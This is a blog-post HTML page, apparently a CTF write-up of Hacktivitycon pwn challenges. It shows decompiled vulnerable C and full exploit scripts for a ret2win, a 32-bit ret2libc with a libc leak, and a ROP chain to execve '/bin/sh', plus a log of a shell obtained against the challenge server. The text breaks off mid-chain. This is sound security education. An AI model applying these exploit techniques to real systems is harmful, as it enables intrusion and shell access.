@@ -1,0 +1,735 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>Hacktivitycon - Pwn challenges &middot; Congo</title>
+    <meta name="title" content="Hacktivitycon - Pwn challenges &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/hacktivitycon-pwn/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/hacktivitycon-pwn/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="Hacktivitycon - Pwn challenges">
+  <meta property="og:description" content="I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2020-08-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-08-01T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Hacktivitycon - Pwn challenges">
+<meta name="twitter:description" content="I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "Hacktivitycon - Pwn challenges",
+    "headline": "Hacktivitycon - Pwn challenges",
+    
+    "abstract": "I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/hacktivitycon-pwn\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2020",
+    "dateCreated": "2020-08-01T00:00:00\u002b00:00",
+    "datePublished": "2020-08-01T00:00:00\u002b00:00",
+    
+    "dateModified": "2020-08-01T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1288"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Hacktivitycon - Pwn challenges
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2020-08-01 00:00:00 &#43;0000 UTC">1 August 2020</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF. I managed to do the every pwn challenge except space one which was heap and the exploitation mechanism of it belongs to GLIBC 2.27 and I am only familiar with GLIBC 2.24 at the moment, but I know what to do this week,</p>
+<!-- more -->
+<h1 id="pancake" class="relative group">Pancake <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#pancake" aria-label="Anchor">#</a></span></h1><p>Pancake challenge was very simple as the buffer overflow was very suspectible as the binary used the <code>gets</code> function which is a vulnerable function as it&rsquo;ll keep taking the input a new line <code>\n</code> is encountered. To our luck, the binary has a function named <code>secret</code> which spawns a shell for us. This was basically a <strong>ret2win</strong> technique.</p>
+<p>The main function looks like:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">desired_pancakes_str</span> <span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">desired_pancakes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">tick_2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">tick_1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">tick_0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">desired_pancakes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to the pancake stacker!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;How many pancakes do you want?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">desired_pancakes_str</span><span class="p">);</span> <span class="cm">/* Vulnerable */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="o">--</span> <span class="n">snip</span> <span class="o">--</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The offset to RIP is <code>152</code> because:</p>
+<ul>
+<li>We have a variable type char of size <code>128</code></li>
+<li>4 integers variables declared afterwars that means, <code>sizeof(int) * 4</code> which is <code>16</code></li>
+<li>Adding the size of variables will be <code>144</code> and adding <code>8</code> to it we get <code>152</code> which is the offset.</li>
+</ul>
+<p>The exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">roppy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;pancake&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./binary&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">152</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s1">&#39;secret_recipe&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># FLAG:  flag{too_many_pancakes_on_the_stack}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h1 id="almost" class="relative group">Almost <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#almost" aria-label="Anchor">#</a></span></h1><p>This challenge was simple ret2libc attack and the binary used strcat to add 3 different buffer to single buffer which made it suspectible to buffer overflow as the 3 different buffer will be able to overflow the buffer <code>s</code> where all of those were being concatenated. Although, giving large buffer to all 3 different inputs will result in segfault in internal <code>strcat</code> function of LIBC.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">build</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">src</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-1C8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+40h] [ebp-188h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+80h] [ebp-148h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">264</span><span class="p">];</span> <span class="c1">// [esp+C0h] [ebp-108h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Insert the protocol:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">getInput</span><span class="p">(</span><span class="o">&amp;</span><span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Insert the domain:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">getInput</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Insert the path:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">getInput</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">strcat</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">3092282</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">strcat</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">47</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">strcat</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Result:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Here, we see that memset fills the variable <code>s</code> with <code>0</code> and then takes input via <code>getInput</code> which is a custom read function which takes upto 64 bytes with the <code>getchar</code> and then checks if the number of input is more than 64. When we send 64 bytes to first and second buffer and send 63 bytes we get segfault and control over EIP.</p>
+<p>So, from here it was just as simple as doing a 32 bit ret2libc, since LIBC wasn&rsquo;t provided I leaked the <code>puts</code> address and used the libc database.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">roppy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;jh2i.com&#34;</span><span class="p">,</span> <span class="mi">50017</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;almost&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc6-i386_2.27-3ubuntu1.2_amd64.so&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">protocol</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">domain</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">path</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;c&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">protocol</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">domain</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">))</span>      <span class="c1"># function </span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s2">&#34;main&#34;</span><span class="p">))</span> <span class="c1"># return address</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">))</span>      <span class="c1"># arg1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">path</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;puts@GOT:   0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">protocol</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">domain</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">path</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Running te exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[07:43:53]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">pwn</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">almost.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">jh2i.com</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">50017</span><span class="p">:</span> <span class="no">Done</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">hacktivity</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">almost</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">hacktivity</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">libc6-i386_2.27-3ubuntu1.2_amd64.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">puts@GOT:</span>   <span class="err">0</span><span class="nf">xf7d8b3d0</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Result:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA</span><span class="err">\</span><span class="no">x80</span><span class="err">��ﾭޏ���</span><span class="no">ccccccccccccccccccccccccccccccccccccccccc</span><span class="p">:</span><span class="c1">//BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA\x80��ﾭޏ���ccccccccccccccccccccccccccccccccccccccccc/ls
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">almost</span>    <span class="no">almost.c</span>  <span class="no">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">flag</span><span class="err">{</span><span class="no">my_code_was_almost_secure</span><span class="err">}</span><span class="no">$</span> 
+</span></span><span class="line"><span class="cl"><span class="no">$</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Closed</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">jh2i.com</span> <span class="no">port</span> <span class="mi">50017</span>
+</span></span></code></pre></div><h1 id="sad" class="relative group">sad <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#sad" aria-label="Anchor">#</a></span></h1><p>This was a statically linked binary and it had a stack overflow vulnerability and since it was statically linked no ret2libc could be done, I chose the ROP way to do a <code>read</code> syscall to store <code>/bin/sh</code> in BSS address and then did a <code>execve</code>syscall. As it was statically linked binary, we had every needed gadget this made it simple to exploit:-</p>
+<p>Exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">roppy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;jh2i.com&#34;</span><span class="p">,</span> <span class="mi">50002</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># flag{radically_statically_roppingly_vulnerable}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40187a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40eda4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40177f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x407aae</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x43f8d7</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss</span>     <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4ae310</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">264</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The read syscall</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span>   
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rsi</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">bss</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdx</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rax</span>
